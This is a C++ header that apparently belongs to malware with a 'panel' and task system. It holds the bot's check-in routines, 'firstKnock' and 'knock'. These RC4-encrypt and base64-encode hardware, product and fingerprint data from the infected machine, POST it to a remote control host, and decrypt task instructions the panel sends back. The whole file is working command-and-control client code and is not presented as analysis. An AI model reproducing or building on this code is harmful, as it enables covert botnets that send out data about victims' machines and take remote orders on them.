#pragma once
/*
	Responce
	{
		"task": (Internal Task ID, 0 for notask),
		"taskId": (GUID for identifying task to panel),
		"taskParm": (optional task parmerters (list)),
	}
*/
#include <string>

namespace absent
{
	namespace panel
	{
		nlohmann::json decryptResponce(std::string res, std::string key)
		{
			absent::crypto::RC4 rc4;
			nlohmann::json responce = nlohmann::json::parse(absent::crypto::b64::decode(res.c_str()));
			for (auto& el : responce.items()) { std::string val = el.value(); el.value() = rc4.crypt(absent::crypto::b64::decode(val.c_str()), key); }
			return responce;

		}

		std::string firstKnock(std::string host, std::string path, nlohmann::json info, std::string key)
		{
			absent::crypto::RC4 rc4;

			for (auto& el : info.items()) { if (el.key() != "fp") { el.value() = absent::crypto::b64::encode(rc4.crypt(el.value(), key).c_str()); } }
			for (int ip = 0; ip < info["fp"].size(); ip++) { info["fp"][ip] = absent::crypto::b64::encode(rc4.crypt(info["fp"][ip], key).c_str()); }
			std::string toSend = absent::crypto::b64::encode(info.dump().c_str());
			toSend = "request=" + toSend;

			return /*decryptResponce(*/absent::http::post(host, path, toSend)/*, key)*/;
		}

		std::string knock(std::string host, std::string path, nlohmann::json info, std::string key)
		{
			absent::crypto::RC4 rc4;
			nlohmann::json smallInfo = 
			{
				{"hw", absent::crypto::b64::encode(rc4.crypt(info["hw"], key).c_str())},
				{"pr", absent::crypto::b64::encode(rc4.crypt(info["pr"], key).c_str())}
			};
			std::string toSend = absent::crypto::b64::encode(smallInfo.dump().c_str());
			
			return decryptResponce(absent::http::post(host, path, toSend), key);
		}
	}
}